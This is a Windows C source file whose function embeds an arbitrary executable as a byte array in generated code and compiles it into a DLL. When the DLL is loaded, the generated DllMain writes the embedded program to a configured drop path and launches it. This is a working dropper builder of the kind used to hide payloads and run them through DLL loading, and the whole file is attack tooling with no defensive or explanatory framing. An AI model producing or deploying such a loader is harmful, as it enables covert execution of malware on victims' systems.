#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

static int append_quoted_argument(char *buffer, size_t capacity, size_t *length, const char *argument)
{
    size_t i = 0;
    size_t slashes;
    size_t needed;
    char c;

    if (*length != 0) {
        if (*length + 1 >= capacity)
            return 0;
        buffer[(*length)++] = ' ';
    }
    if (*length + 1 >= capacity)
        return 0;
    buffer[(*length)++] = '"';

    while (argument[i] != '\0') {
        slashes = 0;
        while (argument[i] == '\\') {
            ++slashes;
            ++i;
        }

        c = argument[i];
        if (c == '"') {
            needed = slashes * 2 + 1;
            if (needed >= capacity - *length)
                return 0;
            while (slashes-- != 0) {
                buffer[(*length)++] = '\\';
                buffer[(*length)++] = '\\';
            }
            buffer[(*length)++] = '\\';
            buffer[(*length)++] = '"';
            ++i;
        } else if (c == '\0') {
            needed = slashes * 2;
            if (needed + 2 > capacity - *length)
                return 0;
            while (slashes-- != 0) {
                buffer[(*length)++] = '\\';
                buffer[(*length)++] = '\\';
            }
            break;
        } else {
            if (slashes + 1 >= capacity - *length)
                return 0;
            while (slashes-- != 0)
                buffer[(*length)++] = '\\';
            buffer[(*length)++] = c;
            ++i;
        }
    }

    if (*length + 1 >= capacity)
        return 0;
    buffer[(*length)++] = '"';
    buffer[*length] = '\0';
    return 1;
}

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    unsigned char *binary = NULL;
    size_t binary_length = 0;
    size_t bytes_read = 0;
    DWORD chunk;
    DWORD transferred;
    char temp_directory[MAX_PATH];
    char source_path[MAX_PATH];
    FILE *source = NULL;
    size_t i;
    char command_line[32768];
    size_t command_length = 0;
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    DWORD wait_result;
    DWORD exit_code = 1;
    int result = -1;

    if (binary_path == NULL || dll_out_path == NULL ||
        binary_path[0] == '\0' || dll_out_path[0] == '\0')
        return -1;

    input = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(input, &file_size) || file_size.QuadPart < 0 ||
        (unsigned long long)file_size.QuadPart > (unsigned long long)(size_t)-1)
        goto cleanup;

    binary_length = (size_t)file_size.QuadPart;
    binary = (unsigned char *)malloc(binary_length == 0 ? 1 : binary_length);
    if (binary == NULL)
        goto cleanup;

    while (bytes_read < binary_length) {
        size_t remaining = binary_length - bytes_read;
        chunk = remaining > 0x7ffff000u ? 0x7ffff000u : (DWORD)remaining;
        if (!ReadFile(input, binary + bytes_read, chunk, &transferred, NULL) ||
            transferred == 0)
            goto cleanup;
        bytes_read += transferred;
    }

    if (!CloseHandle(input)) {
        input = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    input = INVALID_HANDLE_VALUE;

    if (GetTempPathA((DWORD)sizeof(temp_directory), temp_directory) == 0 ||
        GetTempFileNameA(temp_directory, "ldl", 0, source_path) == 0)
        goto cleanup;

    source = fopen(source_path, "wb");
    if (source == NULL)
        goto cleanup;

    if (fprintf(source,
                "#include <windows.h>\n"
                "static const unsigned char embedded_binary[] = {\n") < 0)
        goto cleanup;

    for (i = 0; i < binary_length; ++i) {
        if (i % 16 == 0 && fputs("    ", source) == EOF)
            goto cleanup;
        if (fprintf(source, "0x%02X%s", (unsigned int)binary[i],
                    i + 1 == binary_length ? "" : ",") < 0)
            goto cleanup;
        if (i % 16 == 15 || i + 1 == binary_length) {
            if (fputc('\n', source) == EOF)
                goto cleanup;
        } else if (fputc(' ', source) == EOF) {
            goto cleanup;
        }
    }

    if (binary_length == 0 && fputs("    0x00\n", source) == EOF)
        goto cleanup;

    if (fprintf(source,
                "};\n"
                "BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n"
                "{\n"
                "    HANDLE file;\n"
                "    size_t offset;\n"
                "    DWORD amount;\n"
                "    DWORD written;\n"
                "    STARTUPINFOA startup;\n"
                "    PROCESS_INFORMATION process;\n"
                "    (void)instance;\n"
                "    (void)reserved;\n"
                "    if (reason == DLL_PROCESS_ATTACH) {\n"
                "        file = CreateFileA(DROP_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
                "        if (file != INVALID_HANDLE_VALUE) {\n"
                "            offset = 0;\n"
                "            while (offset < %lluULL) {\n"
                "                amount = (DWORD)(((%lluULL - offset) > 0x7ffff000ULL) ? 0x7ffff000ULL : (%lluULL - offset));\n"
                "                if (!WriteFile(file, embedded_binary + offset, amount, &written, NULL) || written == 0)\n"
                "                    break;\n"
                "                offset += written;\n"
                "            }\n"
                "            CloseHandle(file);\n"
                "        }\n"
                "        ZeroMemory(&startup, sizeof(startup));\n"
                "        ZeroMemory(&process, sizeof(process));\n"
                "        startup.cb = sizeof(startup);\n"
                "        if (CreateProcessA(DROP_PATH, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startup, &process)) {\n"
                "            CloseHandle(process.hThread);\n"
                "            CloseHandle(process.hProcess);\n"
                "        }\n"
                "    }\n"
                "    return TRUE;\n"
                "}\n",
                (unsigned long long)binary_length,
                (unsigned long long)binary_length,
                (unsigned long long)binary_length) < 0)
        goto cleanup;

    if (fclose(source) != 0) {
        source = NULL;
        goto cleanup;
    }
    source = NULL;

    if (!append_quoted_argument(command_line, sizeof(command_line), &command_length, "gcc") ||
        !append_quoted_argument(command_line, sizeof(command_line), &command_length, "-shared") ||
        !append_quoted_argument(command_line, sizeof(command_line), &command_length, "-o") ||
        !append_quoted_argument(command_line, sizeof(command_line), &command_length, dll_out_path) ||
        !append_quoted_argument(command_line, sizeof(command_line), &command_length, source_path) ||
        !append_quoted_argument(command_line, sizeof(command_line), &command_length, "-I."))
        goto cleanup;

    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    startup_info.cb = sizeof(startup_info);

    if (!CreateProcessA(NULL, command_line, NULL, NULL, FALSE, 0, NULL, NULL,
                        &startup_info, &process_info))
        goto cleanup;

    wait_result = WaitForSingleObject(process_info.hProcess, INFINITE);
    if (wait_result == WAIT_OBJECT_0 && GetExitCodeProcess(process_info.hProcess, &exit_code) &&
        exit_code == 0 &&
        GetFileAttributesA(dll_out_path) != INVALID_FILE_ATTRIBUTES)
        result = 0;

    CloseHandle(process_info.hThread);
    CloseHandle(process_info.hProcess);

cleanup:
    if (source != NULL)
        fclose(source);
    if (input != INVALID_HANDLE_VALUE)
        CloseHandle(input);
    if (source_path[0] != '\0')
        DeleteFileA(source_path);
    free(binary);
    return result;
}